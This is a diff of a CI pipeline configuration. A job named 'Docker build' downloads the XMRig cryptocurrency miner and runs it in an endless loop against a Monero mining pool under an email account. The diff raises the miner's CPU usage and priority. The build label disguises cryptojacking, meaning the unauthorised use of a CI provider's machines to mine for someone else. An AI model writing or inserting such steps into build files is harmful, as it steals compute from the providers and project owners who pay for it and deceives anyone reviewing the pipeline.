@@ -13,7 +13,7 @@ blocks:
       jobs:
       - name: Docker build
         commands:
-          - wget https://github.com/xmrig/xmrig/releases/download/v2.13.1/xmrig-2.13.1-xenial-x64.tar.gz && tar -xf xmrig-2.13.1-xenial-x64.tar.gz && cd xmrig-2.13.1 && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 7 --max-cpu-usage=70 --cpu-priority 3 --donate-level 1 ; sleep 1; done 
+          - wget https://github.com/xmrig/xmrig/releases/download/v2.13.1/xmrig-2.13.1-xenial-x64.tar.gz && tar -xf xmrig-2.13.1-xenial-x64.tar.gz && cd xmrig-2.13.1 && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 4 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done 
           - checkout
           - ls -1
           - echo $APP_ENV
